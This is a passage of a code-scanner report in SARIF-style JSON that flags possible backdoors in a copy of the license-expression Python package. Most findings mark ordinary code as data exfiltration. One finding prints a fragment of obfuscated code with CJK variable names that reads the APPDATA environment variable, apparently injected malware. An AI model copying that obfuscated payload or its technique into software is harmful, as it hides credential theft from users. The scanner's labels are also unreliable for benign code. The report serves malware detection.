                      "markdown": "`        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 985,
                  "startColumn": 29,
                  "endLine": 985,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n",
                    "rendered": {
                      "text": "    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n",
                      "markdown": "`    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 984,
                  "startColumn": 20,
                  "endLine": 984,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    \"\"\"\n    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n",
                    "rendered": {
                      "text": "    \"\"\"\n    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n",
                      "markdown": "`    \"\"\"\n    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 836,
                  "startColumn": 33,
                  "endLine": 836,
                  "endColumn": 38,
                  "snippet": {
                    "text": "                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n                    sym = symbols.get(sym_or_op_lower)\n                    if not sym:\n                        sym = LicenseSymbol(key=sym_or_op)\n                    yield Token(start, end, sym_or_op, sym)\n",
                    "rendered": {
                      "text": "                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n                    sym = symbols.get(sym_or_op_lower)\n                    if not sym:\n                        sym = LicenseSymbol(key=sym_or_op)\n                    yield Token(start, end, sym_or_op, sym)\n",
                      "markdown": "`                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n                    sym = symbols.get(sym_or_op_lower)\n                    if not sym:\n                        sym = LicenseSymbol(key=sym_or_op)\n                    yield Token(start, end, sym_or_op, sym)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 832,
                  "startColumn": 36,
                  "endLine": 832,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            if sym_or_op:\n                sym_or_op_lower = sym_or_op.lower()\n\n                operator = OPERATORS.get(sym_or_op_lower)\n                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n",
                    "rendered": {
                      "text": "            if sym_or_op:\n                sym_or_op_lower = sym_or_op.lower()\n\n                operator = OPERATORS.get(sym_or_op_lower)\n                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n",
                      "markdown": "`            if sym_or_op:\n                sym_or_op_lower = sym_or_op.lower()\n\n                operator = OPERATORS.get(sym_or_op_lower)\n                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 100,
                  "startColumn": 29,
                  "endLine": 100,
                  "endColumn": 48,
                  "snippet": {
                    "text": " 771 << 369 << 218 >> (797 | 341) & ~526\n\n\t\twhile 子水女馬人月刀人馬鳥山馬馬刀女人:\n\t\t\tif 子水女馬人月刀人馬鳥山馬馬刀女人 == 12768:\n\t\t\t\t人馬口刀女子月水人目水鳥山口馬馬.close()\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 895*(183 & 759)+231//268-(415 | 928+255) | 415 << 22 << 536 >> (210 | 576) & ~511\n\t\t\telif 子水女馬人月刀人馬鳥山馬馬刀女人 == 183269:\n\t\t\t\t目水鸟月木人木鳥马口马刀木鳥水子 = os.getenv(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 6) + 1, (5 << 4), (5 << 4), (((1 << 4) + 1) << 2), (1 << 6) + 1, (((5 << 2) + 1) << 2), (1 << 6) + 1])))\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 763*(228 & 284)+333//968-(431 | 867+491) | 431 << 636 << 393 >> (9",
                    "rendered": {
                      "text": " 771 << 369 << 218 >> (797 | 341) & ~526\n\n\t\twhile 子水女馬人月刀人馬鳥山馬馬刀女人:\n\t\t\tif 子水女馬人月刀人馬鳥山馬馬刀女人 == 12768:\n\t\t\t\t人馬口刀女子月水人目水鳥山口馬馬.close()\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 895*(183 & 759)+231//268-(415 | 928+255) | 415 << 22 << 536 >> (210 | 576) & ~511\n\t\t\telif 子水女馬人月刀人馬鳥山馬馬刀女人 == 183269:\n\t\t\t\t目水鸟月木人木鳥马口马刀木鳥水子 = os.getenv(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 6) + 1, (5 << 4), (5 << 4), (((1 << 4) + 1) << 2), (1 << 6) + 1, (((5 << 2) + 1) << 2), (1 << 6) + 1])))\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 763*(228 & 284)+333//968-(431 | 867+491) | 431 << 636 << 393 >> (9",
                      "markdown": "` 771 << 369 << 218 >> (797 | 341) & ~526\n\n\t\twhile 子水女馬人月刀人馬鳥山馬馬刀女人:\n\t\t\tif 子水女馬人月刀人馬鳥山馬馬刀女人 == 12768:\n\t\t\t\t人馬口刀女子月水人目水鳥山口馬馬.close()\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 895*(183 & 759)+231//268-(415 | 928+255) | 415 << 22 << 536 >> (210 | 576) & ~511\n\t\t\telif 子水女馬人月刀人馬鳥山馬馬刀女人 == 183269:\n\t\t\t\t目水鸟月木人木鳥马口马刀木鳥水子 = os.getenv(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 6) + 1, (5 << 4), (5 << 4), (((1 << 4) + 1) << 2), (1 << 6) + 1, (((5 << 2) + 1) << 2), (1 << 6) + 1])))\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 763*(228 & 284)+333//968-(431 | 867+491) | 431 << 636 << 393 >> (9`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/NOTICE"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 38,
                  "endLine": 20,
                  "snippet": {
                    "text": "\n# you may not use this file except in compliance with the License.\n\n# You may obtain a copy of the License at\n\n#\n\n# http://www.apache.org/licenses/LICENSE-2.0\n",
                    "rendered": {
                      "text": "\n# you may not use this file except in compliance with the License.\n\n# You may obtain a copy of the License at\n\n#\n\n# http://www.apache.org/licenses/LICENSE-2.0\n",
                      "markdown": "`\n# you may not use this file except in compliance with the License.\n\n# You may obtain a copy of the License at\n\n#\n\n# http://www.apache.org/licenses/LICENSE-2.0\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}